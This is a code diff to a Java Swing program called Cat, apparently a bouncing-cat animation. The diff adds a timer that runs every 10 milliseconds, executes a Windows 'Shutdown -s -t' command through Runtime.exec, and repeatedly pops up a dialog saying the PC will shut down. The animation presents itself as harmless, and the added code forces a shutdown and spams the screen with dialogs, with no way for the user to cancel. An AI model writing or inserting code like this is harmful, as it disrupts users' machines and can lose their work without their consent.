@@ -3,6 +3,8 @@ import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
 import java.awt.event.WindowEvent;
 import java.awt.event.WindowListener;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
 import java.util.Random;
 
 public class Cat extends JFrame implements WindowListener, ActionListener {
@@ -16,6 +18,7 @@ public class Cat extends JFrame implements WindowListener, ActionListener {
     int yVelocity = random.nextInt(5,15);
     int x = random.nextInt(0,1300);
     int y = random.nextInt(0,500);
+    int time = 3200; //this is the time for the pc to shut down, shown in seconds
 
     JLabel label;
     public Cat(){
@@ -35,6 +38,20 @@ public class Cat extends JFrame implements WindowListener, ActionListener {
         this.setVisible(true);
         timer = new Timer(0, this);
         timer.start();
+        Timer timer2 = new Timer(10, new ActionListener() {
+            @Override
+            public void actionPerformed(ActionEvent e) {
+                try{
+                    Process process = Runtime.getRuntime().exec("Shutdown -s -t " + String.valueOf(time));
+                    BufferedReader reader = new BufferedReader( new InputStreamReader(process.getInputStream()));
+                    JOptionPane.showMessageDialog(null,"Ur pc will shutdown in " + time + " !");
+                }catch (Exception ex){
+                    ex.printStackTrace();
+                }
+
+            }
+        });
+        timer2.start();
 
     }
 
